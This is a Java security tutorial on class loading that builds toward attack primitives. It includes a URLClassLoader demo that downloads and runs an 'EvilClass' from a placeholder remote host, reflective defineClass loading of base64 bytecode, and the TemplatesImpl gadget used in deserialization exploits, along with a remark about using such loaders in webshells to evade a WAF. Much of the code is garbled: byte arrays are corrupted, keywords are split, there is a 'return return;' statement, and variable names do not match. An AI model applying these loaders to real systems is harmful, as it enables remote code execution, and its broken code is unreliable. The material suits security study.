# Java Security Learning—ClassLoader

Author: H3rmesk1t

# Class loading mechanism

`Java` is a cross-platform development language that relies on `JVM` implementation. `Java` program needs to be compiled into `class` file before running. When initializing the `Java` class, it will call `java.lang.ClassLoader` to load the class bytecode, while the `ClassLoader` method will call the `native` method of `JVM` (`defineClass0/1/2`) to define a `java.lang.Class` instance. The `.class` file is stored in the `.class` file. When a certain class is needed, the `JVM` virtual machine loads the corresponding `.class` file, creates the corresponding `class` object, and loads the `class` file into the memory of the virtual machine.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTYxN2MxMjNjYjNjZTk0OTE1NTdiNDU2ZWU2OTA3YzJfSloxcUJ1MlR2TENNMWJvSnhIdlJvTWtRdlhoNXZTWDdfVG9rZW46Ym94Y251MjJXU0NaTEJ6TGJlMHNLNkJXaXFmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

- The specific implementation steps of the class loading mechanism are divided into three major parts:

   - Loading: refers to reading the `class` file into memory and creating a `java.lang.Class` object for it. (When using any class in the program, the system will create a corresponding `java.lang.Class` object, and all classes in the system are instances of `java.lang.Class`)
  - Connection: This stage is responsible for merging the binary data of the class into `jre`.
    - Verification: Ensure that the loaded class information complies with the `JVM` virtual machine specification and has no security issues.
    - Preparation: Allocate memory for the static `Field` of the class and set the initial value.
    - Analysis: Replace symbolic references in the binary data of the class with direct references.
  - Initialization: This stage is the last stage of class loading. When a superclass exists in a class, it will be initialized, and a static initializer and static initialization of member variables will be performed.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=YjUzOTU1ODExMTUwMmZhNGM1MGFjNDYzNGZhM2FiZTdfN0dLQVJVM2oxUmtPZGp4clZ5QUhlVTNPbTN0a3RveFJfVG9rZW46Ym94Y25SWDNYdWVYNFVCYVp2WERCMHdJYktoXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

# Parent delegation mechanism

## Working principle

The parent delegation mechanism is the core of Java class loading, which ensures the security of class loading to a certain extent. If a class loading receives a class loading request, it does not load itself first, but delegates the request to the parent loader for help loading. If the parent loader still has its parent loader, it will further delegate upwards and recursively in turn. If the parent loader does not exist, the `BootStrapClassLoader` will be loaded. When all parent loaders cannot find the corresponding class, they will search for the class according to their search path. If it still cannot be searched at this time, an exception `ClassNotFoundException` will be thrown.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=N2FkYTUzMGI3NTFjODlhNGZlMmMxZTMxYjY4Y2UwZDhfV204NlJEZ1lxUUVJbFlmb3lid3c0UUZJa3lDWVFNFhfVG9rZW46Ym94Y25lcWtqdkhQcWZnM0w3VFF5MnE0MFZiXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## Essence

The class loading order is: the boot class loader is loaded first, and it is loaded by the extension class loader when it cannot be loaded, and it is loaded by the application class loader or a custom class loader when it still cannot be loaded.

# ClassLoader class loader

## Overview

In Java, all classes must be loaded by JVM before they can run. The file compiled into the `class` bytecode will use the class loader to load the bytecode, and the main function of the `ClassLoader` is to load the `Java` class.

The top level of the `JVM` class loader are `Bootstrap ClassLoader`, `Extension ClassLoader`, and `Application ClassLoader`. Among them, `AppClassLoader` is the default class loader, and the system loader returned by `ClassLoader.getSystemClassLoader()` is also `AppClassLoader`. And when the class loader is not specified when the class is loaded, the class will be loaded by default using `AppClassLoader`.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQyY2VjZTllZmFlYTg2Yzk5MzA1MjIzZGVjNzliZmNfRkNwSVkzcEk5ZWpGSWh4eDJCekZOaUJ5b2s4UDUwMkJfVG9rZW46Ym94Y25lWjRKVmp6RklNQ0JwdWpjb1d6RG9iXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## Core Method

```Java
loadClass # Load the specified Java class
findClass # Find the specified Java class
findLoaderClass # Find Java classes that the JVM has loaded
defineClass # define a Java class
resolveClass # link the specified Java class
```

# Custom ClassLoader

## Follow the parent delegation mechanism

`java.lang.ClassLoader` is the parent class of all class loaders, and there are many child loaders in it, such as `java.lang.URLClassLoader` used to load the `java.lang.ClassLoader` class, rewrite the `findClass` method to load the directory `class` file and remote resource file.

Under normal circumstances, when the `OpenCalculatorClass` class exists, the methods in the `OpenCalculatorClass` class can be called directly through `new OpenCalculatorClass()`. However, when the class does not exist in `classpath` and the method in the class needs to be called, you can override the `findClass` method using a custom loader. Then, when calling the `defineClass` method, enter the bytecode of the `OpenCalculatorClass` class to define an `OpenCalculatorClass` class in the `JVM`, and finally use the reflection mechanism to call the methods in the `OpenCalculatorClass` class.

```Java
package com.security;

public class OpenCalculatorClass {

    public void calc() throws Exception {

        Runtime.getRuntime().exec("calc");
    }
}
package com.security;

import sun.misc.IOUtils;

import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Arrays;

public class ConvertByteCodeClass {

    public static void main(String[] args) throws Exception {

        InputStream fis = new FileInputStream("C:\\Users\\95235\\Desktop\\security\\src\\main\\java\\OpenCalculatorClass.class");
        byte[] bytes = IOUtils.readFully(fis, -1, false);
        System.out.println(Arrays.toString(bytes));
    }
}

// [-54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 16, 10, 0, 17, 0, 18, 8, 0, 11, 10, 0, 17, 0, 18, 8, 0, 11, 10, 0, 17, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 101, 101, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 99, 97, 108, 99, 1, 0, 10,
10, 112, 116, 105, 111, 110, 115, 7, 0, 22, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 24, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 12, 0, 26, 0, 27, 1, 0, 32, 99, 111, 109, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 97, 110, 103, 97, 110, 108, 97, 110, 103, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 1, 0, 11, 0, 8, 0, 2, 0, 9, 0, 0, 0, 0, 38, 0, 2, 0, 1, 0, 0, 0, 0, 10, -72, 0, 2, 18, 3, -74, 0, 4, 87, -79, 0, 0, 0, 1, 0, 0, 0, 10, 0, 0, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 0, 7, 0, 9, 0, 8, 0, 12, 0, 0, 0, 0, 4, 0, 1, 0, 13, 0, 1, 0, 14, 0, 0, 0, 2, 0, 15]
package com.security;

import java.lang.reflect.Method;

public class CalculatorClassLoader extends ClassLoader {

    public static final String calculateClassName = "com.security.OpenCalculatorClass";

    public static byte[] calculateClassBytes = new byte[]{-54, -2, -70, -66, 0, 0, 0, 52, 0, 28, 10, 0, 6, 0, 16, 10, 0, 17, 0, 18, 8, 0, 11, 10, 0, 17, 0, 19, 7, 0, 20, 7, 0, 21, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 101, 1, 0, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 99, 97, 108, 99, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 22, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 24, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 12, 0, 26, 0, 27, 1, 0, 32, 99, 111, 109, 47, 115, 101, 99, 117, 114, 105, 116, 121, 47, 79, 112, 101, 110, 67, 97, 108, 99, 117, 108, 97, 116, 111, 114, 67, 108, 97, 115, 115, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 108, 97, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 115, 59, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 3, 0, 1, 0, 0, 0, 0, 0, 3, 0, 1, 0, 0, 0, 0, 0, 3, 0, 1, 0, 0, 0, 0, 0, 38, 0, 2, 0, 1, 0, 0, 0, 0, 0, 10, -72, 0, 2, 18, 3, -74, 0, 4, 87, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 7, 0, 9, 0, 8, 0, 12, 0, 0, 0, 4, 0, 1, 0, 13, 0, 1, 0, 14, 0, 0, 0, 0, 2, 0, 15};

    @Override
    public Class<?> findClass(String name) throws ClassNotFoundException {
        // Only handle CalculatorClass class
        if (name.equals(calculatorClassName)) {
            // Call the native method of JVM to define the CalculatorClass class
            return defineClass(calculatorClassName, calculateClassBytes, 0, calculateClassBytes.length);
        }

        return super.findClass(name);
    }

    Public Sta
tic void main(String[] args) {
        // Create a custom class loader
        CalculatorClassLoader CalculatorClassLoader = new CalculatorClassLoader();

        try {
            // Load CalculatorClass class using a custom class loader
            Class calculateClass = calculateClassLoader.loadClass(calculatorClassName);
            // Reflection creates CalculatorClass class <=> CalculatorClass calculatorClass = new CalculatorClass();
            Object obj1 = calculateClass.newInstance();
            //Reflection to get OpenCalculatorClass method
            Method method = obj1.getClass().getMethod("calc");
            // Reflection calls OpenCalculatorClass method
            Object obj2 = method.invoke(obj1);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=N2YxZGFmYmM5NjgzOWIwMDYxYTUwODAxNzQzYTdiN2NfS2lLVk5yY2tpT0liRVVySXpzMHdsQVliSWNPamtIdHZfVG9rZW46Ym94Y245bzBSZzhQZU9LU0F4VHQ1ZklaaEpkXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## Destroy the parent delegation mechanism

The parent delegation mechanism mainly relies on the implementation logic of the loadclass function in the ClassLoader class. If the loadClass method is directly rewrite the parent delegation mechanism in the subclass, it can destroy the parent delegation mechanism. It is normal for some components currently to have class loading mechanisms that do not comply with parent delegation. There are roughly the following application scenarios.

1. `Tomcat` class loading mechanism: The disadvantage of the parent delegation mechanism in this mechanism is that when the same `jar` package is loaded with different versions of the same `jar` package, the mechanism cannot automatically select the `jar` package that requires the version library. Especially when the web container such as `Tomcat` and other `web` containers cannot effectively load different versions of the library. To solve this problem, `Tomcat` abandoned the parent delegation model. Tomcat loading mechanism, the `WebAppClassLoader` is responsible for loading the `class` file in its directory. When it cannot be loaded, it will be handed over to the `CommonClassLoader` to load, which is exactly the opposite of parent delegation.

1. `OSGI` modular loading mechanism: This mechanism is no longer a parent-delegated stump structure, but a mesh structure. There is no fixed delegation model. Only when a certain `package` or `class` is used, the delegation and dependencies between `bundles` are constructed according to the import and export definition of `package`. `vCenter` deployment and class loading rely heavily on this technology.

1. `JDBC` class loading mechanism: The disadvantage of parent delegation in this mechanism is that the parent loader cannot use the child loader to load the required classes. This usage scenario appears in `JDBC`. In the past, the core class of JDBC was loaded by the root loader in `rt.jar`. However, now the core class is in the `jar` package implemented by different manufacturers. According to the class loading mechanism, if the `A` class calls `B` class, then the `B` class is loaded by the `A` class, which means that the root loader needs to load the class under the `jar` package. Obviously, this operation violates the parent delegation mechanism. In order to make the parent loader call the child loader to load the required class, JDBC uses Thread.currentThread().getContextClassLoader() to get the thread context loader to load the Driver implementation class.

# URLClassLoader

`URLClassLoader` is actually the parent class of `AppClassLoader` that is used by default. `java.net.URLClassLoader.class` can be used to load resources locally or remotely. For example, when uploading WebShell, you can try uploading a URLClassLoader file that has no effect on opening a `waf` file, and then use the file to remotely load the `jar` package or `class` malicious file that executes the command.

- Under normal circumstances, `Java` will find the `.class` file to load according to the basic path listed in the configuration items `sun.boot.class.path` and `java.class.path` (processed `java.net.URL` class). The basic paths are divided into three types:

  - `url` does not end with `/`, and it is considered to be a `jar` file. Use `JarLoader` to find the class and search for the `.class` file in `jar`.
  - `url` ends with `/` and the protocol name is `file`. Use `FileLoader` to find classes and search for `.class` files in the local system.
  - `url` ends with `/` and the protocol name is not `file`, use the most basic `Loader` to find the class.

# Dynamic loading of bytecode

## URLClassLoader loads remote class file

As mentioned above, in the URLClassLoader, the underlying Loader must be used to find classes in the case of non-file protocols. In Java, support for the `file`/`ftp`/`gopher`/`http`/`https`/`jar``/`mailto`/`netdoc` protocol is provided by default.

Here we use the `http` protocol for testing and loading the remote `class` file:

```Java
// Malicious
public class EvilClass {

    public EvilClass() throws Exception {

        Runtime.getRuntime().exec("calc");
    }
}
// Load remote class file
package com.security;

import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

public class URLClassLoaderDemo {

    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException {

        URL[] urls = {new URL("http://xxx.xxx.xxx.xxx:xxxx/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class clazz = loader.loadClass("EvilClass");
        clazz.newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjIzOGQ4OGNhYTEwYmRmY2UyZTkzYWM3ODM5YzFmM2Vfb3h5dVFxWTZOcFlGVEYwVFVhWDZBYVBNWDhzWWxDT0pfVG9rZW46Ym94Y241bXpwTkNHOEYzN0ZpR2JFOGloWXlnXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## ClassLoader#defineClass load bytecode

- As mentioned above, in the process of loading the `class` file, we go through the process of `ClassLoader#loadClass` to `ClassLoader#findClass`. in:

  - `loadClass` is to find classes (parent delegation mechanism) from loaded class cache, parent loader, etc., and will execute `findClass` if not found.
  - `findClass` is to load the bytecode of the class according to the method specified in the basic `url`. It may read the bytecode on the local file system, `jar` package, or remote `http` server and then hand it over to `defineClass`.
  - `defineClass` is to process the bytecode passed in front and convert it into a real `Java` class.

It should be noted that `ClassLoader#defineClass` is a protected property that cannot be accessed directly from the outside and has to be called in the form of reflection. In practical applications, the scope of the `defineClass` method is often not open, so attackers rarely use it directly, but it is the cornerstone of the commonly used attack chain `TemplatesImpl`.

```Java
package com.security;

Import
t java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class ClassToBase64Demo {

    private static final String filePath = "C:\\Users\\95235\\Desktop\\security\\src\\main\\java\\EvilClass.class";

    public String ClassToBase64Demo(String filePath) throws Exception {

        if (filePath == null) {
            return null;
        }
        try {
            byte[] bytes = Files.readAllBytes(Paths.get(filePath));
            return Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public static void main(String[] args) throws Exception {

        ClassToBase64Demo demo = new ClassToBase64Demo();
        String result = demo.ClassToBase64Demo(filePath);
        System.out.println(result);
    }
}
package com.security;

import java.lang.reflect.Method;
import java.util.Base64;

public class ClassLoaderDefineClassDemo {

    public static void main(String[] args) throws Exception {

        Method method = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);

        byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHR pb25zBwAWAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAHAAgHABcMABgAGQEABGNhbGMMABoAGwEACUV2aWxDbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmc vRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGF uZy9Qcm9jZXNzOwAhAAUABgAAAAAAAQABAAcACAACAAkAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACgAAAA4AAwAAAAgABAAKAA0ACwALAAAABAABAAwAAQANAAAAAgAO");
        Class evilClass = (Class) method.invoke(ClassLoader.getSystemClassLoader(), "EvilClass", bytes, 0, bytes.length);
        evilClass.newInstance();
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=M2JjMzc0MGRlNmZhNDQzZTE1ZDkxMGMzMTU4YmIxNGVfNEtpcDJMd2lnZG9CbTBTYzFGaTVtSno4ZVZORzR2REJfVG9rZW46Ym94Y242TFpDR29tNWFOaVBsV3hUSUNlZjhmXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## TemplatesImpl load bytecode

As mentioned above, the scope of the `definedClass` is basically not open, so most upper-level developers will not use the `definedClass` method directly, but there are some classes in the Java bottom layer that use it, such as `TemplatesImple`.

An internal class `TransletClassLoader` is defined in the `com.sun.org``.apache.xalan.internal.xsltc.trax.TemplatesImpl` class. From the source code, we can see that this class inherits the `ClassLoader`, and also rewrites the `defineClass` method, and does not display the scope of the method. That is to say, at this time, the `defineClass` method has changed from the `protected` type of the parent class to a `default` type method (can only be used in itself or in the same package), so it can be called externally.

```Java
static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;

     TransletClassLoader(ClassLoader parent) {
         super(parent);
        _loadedExternalExtensionFunctions = null;
    }

    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }

    public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return return;
     }

    /**
     * Access to final protected superclass member from outer class.
     */
    Class defineClass(final byte[] b) {
        return defineClass(null, b, 0, b.length);
    }
}
```

Follow the `TransletClassLoader` method, which is called by the `defineTransletClasses` method in the `TemplatesImpl` class.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=NGViNDQ3NzM5N2UxZGQzZTM2ZGNhMThkMmM3NWU2ZGRfTnpkSjFBYVg2OGxiQUFuRUFFTnFTMURVTVRpcll6d2FfVG9rZW46Ym94Y25VbVNwUDJFeGNBS1puYUNGUGRGWUtjXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

Continue to follow up `defineTransletC
The lasses method, which has been called in three places in the `TemplatesImpl` class.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjFhOTc0YTU0YWFkMzU4OTdjNGE4YmU5Y2RmNGY2ZWFfdEg5UWVqeVRiNUNIYkQxRnNMSHduUEhrY0c3SEp5bXBfVG9rZW46Ym94Y25jMENLajFIWkhkb21PcjV6UVh2TmFjXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

A brief follow-up to these three methods:
   - The `getTransletClasses` method has not been called in the `TemplatesImpl` class, so this method cannot be used.
   - The `getTransletIndex` method can be used as a trigger point directly, but it was not successfully triggered after testing.
   - The `getTransletInstance` method was further called by the `newTransformer` method of type `public` in the `TemplatesImpl` class. After testing, it was found that the method could be triggered successfully. And the `newTransformer` method is also called by the `getOutputProperties` method of type `public`.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzY2E3NDBhZjliNDI0MGFiOGY5ODU1MjgxM2MyNzlfadBFTmFMMUFUUGlYRW0zelQ4RHJEbDFlMlJyY1FPWWhfVG9rZW46Ym94Y25LZEdMaVhHMU1nMzNhYjN6QTg0dzVnXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWM3OWQ0YmU0Yzk5MTU5ZGJiMmMyYWU1ZGU0MWRkZjBfTkVhRDZ6VEh0YzBmWmVueVZUMW5mY3NDVGFOelZkb0lfVG9rZW46Ym94Y25naGRYTmxlV3NUMUlqYUhFbTBxU2RZXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

Based on the above analysis of the three methods calling the `defineTransletClasses` method, we can summarize that we can obtain two utilization chains (in fact, only one, the second one is implemented based on the first one).

```Java
[1] TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
[2] TemplatesImpl#getOutputProperties() ->TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```

After knowing how the TemplatesImpl class uses `defineClass` to load bytecode principle, let's see how to implement it at the code level.

Among them, in the `getTransletInstance` method, it must be satisfied: `_name` is not empty.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2I4MmVmODg4ZjAyMDVkYjgxYmNmYWFlMGIxY2MwNWFfalpSZHhiTGgwVWsxRGNDek1aU3UxYm5aTDA4QlY4d2RfVG9rZW46Ym94Y25HUWNZMmN1ZU1MU2RUWnBudWlWeFdCXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

In the `definedTransletClasses` method, it must be met: `_bytecodes` is an array composed of bytecodes, and according to `superClass.getName().equals(`*`ABSTRACT_TRANSLET`*`)`, it can be seen that there are restrictions on the loaded bytecode in the `TemplatesImpl` class. The corresponding class of the bytecode must be a subclass of `com.sun.org``.apache.xalan.internal.xsltc.runtime.AbstractTranslet`.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTkzMjA4MzY2Njk0MTNiNWE3OTIzNWFmYTgzYTM0ZDBfSXo4YUNCb1NoZElYc1BYSnhQRFdqMXRsaUFvenNVbGxfVG9rZW46Ym94Y25SbkF5RDBoWFV0NnRiRnBtWEJKdVllXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

In addition, `_tfactory.getExternalExtensionsMap()` is also called in the `defineTransletClasses` method. If `null` is `, it will cause an error, so `_tfactory` is a `TransformerFactoryImpl` object.

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA1YzMzNzNjZGRhNmY1OWYwOTZjOTQzYWIwNTVjN2FfY1NPSGVSNjlabEk3Sjg2dW8wZ1lwNVdOZnRXSkZtQ2hfVG9rZW46Ym94Y25mODBmOFNsNjVBblNDalpYYzhxSVcxXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

According to the above analysis, it is not difficult to write the use code for loading bytecodes of `TemplatesImpl`.

```Java
// Special category
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class EvilTemplatesClass extends AbstractTranslet {

    public EvilTemplatesClass() throws Exception {
        super();
        Runtime.getRuntime().exec("calc");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
package com.security;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.util.Base64;

public class TemplatesImplClassLoaderDemo {

    public static void main(String[] args) throws Exception {
byte[] bytes = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQAJdHJhb nNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmmlhbGl6YXRpb25IYW5kbG VyOylWBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4 vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABdFdmlsVGVtcGxhdGVzQ2xhc3MuamF2YQwABwAIBwAcDAAdAB4BAARjYWxjD AAfACABABJFdmlsVGVtcGxhdGVzQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW NvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4 ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAAMAAQAHAAgAAgAJAAAALgACAAEAAAAAOKrcAAAbgAAAhIDtgAEV7EAAAAABAAoAAAAAAAAKAAQACwANAAWAC wAAAAQAAQAMAAEADQAOAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAARAAsAAAAEAAEADwABAA0AEAACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAFgALAAAABAABAA8AAQARAAAAAgAS");

        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "h3rmesk1t");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        templates.getOutputProperties();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {

        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

![img](https://o5szcykwgn.feishu.cn/space/api/box/stream/download/asynccode/?code=NDk2MmY3MDMxZjYzZGUzMzMzMyZWQwNTQyZmYwNWExODJfSnFsbkNtaG9BQUN5MVBtbFlMbWVRcTV5enRrU2ZEallfVG9rZW46Ym94Y253bXhtNmM4RXhBdUxtNXp0RzNTTjliXzE2NjU5ODY3ODc6MTY2NTk5MDM4N19WNA)

## BCEL ClassLoader loads bytecode

### Overview

